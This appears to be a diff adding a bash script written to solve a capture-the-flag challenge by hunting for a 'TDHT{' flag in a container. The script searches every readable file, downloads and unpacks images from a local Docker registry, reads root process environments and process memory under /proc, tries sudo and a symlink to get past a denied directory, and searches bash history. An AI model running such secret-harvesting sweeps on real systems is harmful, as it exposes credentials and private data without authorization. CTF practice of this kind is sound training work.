@@ -1,0 +1,115 @@
+# STOLEN SCHEMATICS - EXHAUSTIVE FINAL SEARCH
+# New instance detected - try absolutely everything
+
+echo "=== [1] NUCLEAR: Search ALL readable files for TDHT ==="
+find / -type f -readable 2>/dev/null | while read f; do grep -l "TDHT{" "$f" 2>/dev/null && echo "FOUND IN: $f"; done | head -5
+
+echo -e "\n=== [2] Search ALL registry images that ACTUALLY exist ==="
+python3 << 'PYEND'
+import urllib.request, json, gzip, io, tarfile
+
+REG = "http://172.27.0.1:5000"
+
+def gj(u):
+    r = urllib.request.Request(u)
+    r.add_header("Accept", "application/vnd.oci.image.index.v1+json, application/vnd.docker.distribution.manifest.v2+json")
+    return json.load(urllib.request.urlopen(r, timeout=20))
+
+# Get catalog
+try:
+    cat = gj(f"{REG}/v2/_catalog")
+    repos = cat.get("repositories", [])
+    print(f"Repositories: {repos}")
+    
+    for repo in repos:
+        try:
+            tags_data = gj(f"{REG}/v2/{repo}/tags/list")
+            tags = tags_data.get("tags", [])
+            print(f"\n{'='*60}")
+            print(f"{repo}: {tags}")
+            print("="*60)
+            
+            for tag in tags:
+                try:
+                    m = gj(f"{REG}/v2/{repo}/manifests/{tag}")
+                    layers = m.get("layers", [])
+                    
+                    for idx, L in enumerate(layers[:5]):  # Check first 5 layers per tag
+                        digest = L.get("digest")
+                        size = L.get("size", 0)
+                        
+                        if size > 10000000:  # Skip huge layers
+                            continue
+                        
+                        try:
+                            d = urllib.request.urlopen(f"{REG}/v2/{repo}/blobs/{digest}", timeout=15).read()
+                            try:
+                                raw = gzip.decompress(d)
+                            except:
+                                raw = d
+                            
+                            if b"TDHT{" in raw:
+                                print(f"\n{'='*60}")
+                                print(f"FLAG FOUND in {repo}:{tag} layer {idx}!")
+                                print("="*60)
+                                i = raw.find(b"TDHT{")
+                                print(raw[i:i+100].decode('utf-8', 'replace'))
+                                exit(0)
+                            
+                            try:
+                                tf = tarfile.open(fileobj=io.BytesIO(raw))
+                                for mem in tf.getmembers():
+                                    if mem.isfile() and mem.size < 1000000:
+                                        c = tf.extractfile(mem).read()
+                                        if b"TDHT{" in c:
+                                            print(f"\n{'='*60}")
+                                            print(f"FLAG in {repo}:{tag}/{mem.name}!")
+                                            print("="*60)
+                                            print(c.decode('utf-8', 'replace')[:500])
+                                            exit(0)
+                            except:
+                                pass
+                        except Exception as e:
+                            pass
+                            
+                except Exception as e:
+                    print(f"  Manifest error for {tag}: {str(e)[:50]}")
+        except Exception as e:
+            print(f"Tags error for {repo}: {str(e)[:50]}")
+except Exception as e:
+    print(f"Catalog error: {e}")
+
+print("\nNo flag in registry")
+PYEND
+
+echo -e "\n=== [3] Check common locations ==="
+for loc in /flag /flag.txt /tmp/flag /tmp/flag.txt ~/flag ~/flag.txt /opt/flag /var/flag /etc/secret /root/flag.txt; do
+    cat "$loc" 2>/dev/null && echo "Found at: $loc"
+done
+
+echo -e "\n=== [4] Check if .sync has different permissions now ==="
+sudo ls -la /opt/mc/.sync/ 2>/dev/null || ls -la /opt/mc/.sync/ 2>/dev/null || echo "Still denied"
+
+echo -e "\n=== [5] Try reading through symlink ==="
+ln -sf /opt/mc/.sync/sync.result ~/myresult 2>/dev/null
+cat ~/myresult 2>/dev/null
+
+echo -e "\n=== [6] Check entrypoint for clues ==="
+cat /entrypoint.sh | grep -i "flag\|TDHT\|secret"
+
+echo -e "\n=== [7] Environment of root processes ==="
+for pid in 1 16; do
+    sudo cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -i "FLAG\|TDHT" && echo "Found in PID $pid"
+done
+
+echo -e "\n=== [8] LAST RESORT: Brute force search ==="
+strings /proc/16/mem 2>/dev/null | grep "TDHT{" | head -5
+find /opt/mc -type f 2>/dev/null | xargs strings 2>/dev/null | grep "TDHT{" | head -5
+
+echo -e "\n=== [9] Check Minecraft server for embedded flag ==="
+strings /opt/mc/*.jar 2>/dev/null | grep "TDHT{" | head -5
+find /opt/mc -name "*.jar" -exec strings {} \; 2>/dev/null | grep "TDHT{" | head -5
+
+echo -e "\n=== [10] Final check - maybe it's in bash history ==="
+cat ~/.bash_history | grep "TDHT{" 
+history | grep "TDHT{"
